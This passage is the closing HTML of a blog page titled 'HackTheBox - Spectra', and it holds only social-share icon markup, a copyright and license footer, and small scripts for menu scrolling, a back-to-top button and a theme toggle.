17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Spectra on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fspectra%2f&title=HackTheBox%20-%20Spectra&summary=HackTheBox%20-%20Spectra&source=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fspectra%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Spectra on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fspectra%2f&title=HackTheBox%20-%20Spectra"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Spectra on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fspectra%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Spectra on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20Spectra%20-%20https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fspectra%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Spectra on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20Spectra&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fspectra%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></div></main><footer class=footer><span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a>&nbsp;&&nbsp;<a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>&nbsp;(mod)</span>
<span><span class=copyright>&copy; 2022&nbsp;<a href=https://fahmifj.github.io/about>Fahmi FJ</a></span>
&nbsp;·&nbsp;
<span class=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/>CC BY-NC-SA 4.0</a></span></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>